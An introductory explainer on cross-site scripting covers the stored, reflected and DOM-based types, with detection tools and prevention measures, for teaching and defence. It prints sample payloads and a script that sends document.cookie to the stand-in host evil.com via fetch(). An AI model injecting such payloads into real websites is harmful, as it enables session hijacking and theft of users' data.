What is XSS (Cross-Site Scripting)?

XSS is a web vulnerability where an attacker injects malicious JavaScript into a trusted website, which then runs in the victim’s browser.

👉 Goal: steal data, hijack sessions, deface pages, or perform actions as the user.

Why XSS is Dangerous

Steals cookies & session tokens

Performs actions on behalf of the user

Redirects users to fake/malicious sites

Keylogging & phishing

Breaks user trust in websites

How XSS Works (Simple Flow)

Website accepts user input (comment, search box, form)

Input is not properly validated or sanitized

Malicious script is stored or reflected

Victim opens the page

Script executes in victim’s browser

Types of XSS Attacks
1️⃣ Stored XSS (Persistent XSS)

Malicious script is stored on the server

Executes whenever any user visits the page

Example:

<script>alert("Hacked!")</script>


Where found:

Comment sections

Forums

User profiles

🛑 Most dangerous type

2️⃣ Reflected XSS (Non-Persistent)

Script is reflected in the response

Comes from URL or form input

Example URL:

http://site.com/search?q=<script>alert(1)</script>


Triggered when:

Victim clicks malicious link

3️⃣ DOM-Based XSS

Happens entirely in the browser

JavaScript modifies the DOM unsafely

Example:

document.innerHTML = location.hash;


🧠 Server not involved directly

Common XSS Payloads
<script>alert(1)</script>
<img src=x onerror=alert(1)>
<script>document.cookie</script>

Real-World Example

Attacker injects:

<script>
fetch("https://evil.com?cookie="+document.cookie);
</script>


➡️ Victim’s session cookie is stolen

How to Detect XSS (Testing)

Input fields

URL parameters

Cookies & headers

Burp Suite (Repeater, Intruder)

TryHackMe / PortSwigger labs

Prevention & Mitigation
🔐 Developer Side

Input validation

Output encoding (HTML, JS, URL)

Use Content Security Policy (CSP)

Avoid innerHTML

Use frameworks (React, Angular)

🧑‍💻 User Side

Avoid clicking unknown links

Use browser security extensions

XSS vs SQL Injection
Feature	XSS	SQLi
Target	User browser	Database
Language	JavaScript	SQL
Impact	Session hijack	Data leak
